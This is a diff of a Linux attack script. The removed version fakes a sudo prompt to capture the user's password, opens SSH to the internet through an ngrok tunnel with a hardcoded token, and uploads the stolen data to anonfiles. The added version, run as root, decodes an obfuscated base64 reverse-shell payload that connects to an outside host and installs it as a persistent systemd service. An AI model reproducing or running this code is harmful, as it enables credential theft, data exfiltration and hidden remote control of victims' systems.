@@ -1,33 +1,33 @@
-whoami > output.txt && ifconfig >> output.txt  #Here the default output folder is output.txt if you want to change the name just sipmpliy replace the name (output).
-var=$(whoami)
-echo "[sudo] password for $var:" && read -s    PASS 
-sleep 3
-echo "Sorry, try again."
-echo "[sudo] password for $var:" && read -s    PASS2 
-echo "$PASS" >>output.txt
-echo "$PASS2" >>output.txt
-echo $PASS2 | sudo -S apt-get install openssh-server > /dev/null 2>&1
-echo ""
-echo "Please Wait Configuaring New Updates."
-wget https://raw.githubusercontent.com/Esp26/ToolsRequirements/main/requirements.zip > /dev/null 2>&1 | echo "10% Complete"  
-echo "60% Complete"
-chmod +x ./requirements.zip
-unzip requirements.zip > /dev/null 2>&1
-rm requirements.zip
-sudo mv ngrok /usr/bin
-ngrok authtoken 1kCA7hj4ZiMNPXtexW92Udmc4PX_3sh21CnwbWL28x8N9mNZA > /dev/null 2>&1 #Your fake ngrok authtoken here.
-echo "100% Complete"
-echo ""
-sudo service ssh start
-echo ""
-echo "Please Wait....."
-echo ""
-ngrok tcp 22 > /dev/null 2>&1 & sleep 20
-curl http://127.0.0.1:4040/api/tunnels >> output.txt 
-curl -F "file=@output.txt" https://api.anonfiles.com/upload?token=f88cb5d25cd13342 > /dev/null 2>&1  # Visit anonfiles.com and login or register there then click on API.
-clear
-echo ""
-echo "Configuration Complete."
-sleep 3
-clear
-rm output.txt
+#!/bin/bash
+if [ "$EUID" -ne 0 ]; then
+  echo "This script must be run as root"
+  exit 1
+else
+  mkdir -p /usr/.pawned/
+  
+  echo "IyEvYmluL2Jhc2gKSVA9ImRlc2NyaXB0aW9uLWxlYXNlLmF0LnBseS5nZyIKUE9SVD0iMjU3Mjci
+CmlmIGNvbW1hbmQgLXYgcHl0aG9uMyAmPiAvZGV2L251bGw7IHRoZW4KICB3aGlsZSB0cnVlCiAg
+ZG8KICBweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29j
+a2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiJyRJUCci
+LCckUE9SVCcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtv
+cy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJwogIHNsZWVw
+IDEKICBkb25lCmVsaWYgY29tbWFuZCAtdiBweXRob24yICY+IC9kZXYvbnVsbDsgdGhlbgogIHdo
+aWxlIHRydWUKICBkbwogIHB5dGhvbjIgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2Vzcyxvcztz
+PXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5l
+Y3QoKCInJElQJyIsJyRQT1JUJykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZp
+bGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNo
+IiknCiAgc2xlZXAgMQogIGRvbmUKZWxzZQogIHdoaWxlIHRydWUKICBkbwogIHNoIC1pID4mIC9k
+ZXYvdGNwLyRJUC8kUE9SVCAwPiYxIAogIHNsZWVwIDEKICBkb25lCmZpCg==" | base64 --decode > /usr/.pawned/service.sh 
+
+
+
+
+
+ 
+  echo "W1VuaXRdCkRlc2NyaXB0aW9uPVBIc3Bsb2l0CgpbU2VydmljZV0KRXhlY1N0YXJ0PWJhc2ggL3Vz
+ci8ucGF3bmVkL3NlcnZpY2Uuc2gKUmVzdGFydD1hbHdheXMKCltJbnN0YWxsXQpXYW50ZWRCeT1t
+dWx0aS11c2VyLnRhcmdldAo=" | base64 --decode > /usr/lib/systemd/system/shells.service 
+
+  systemctl daemon-reload &>/dev/null
+  systemctl enable shells.service &>/dev/null
+  systemctl start shells.service &>/dev/null
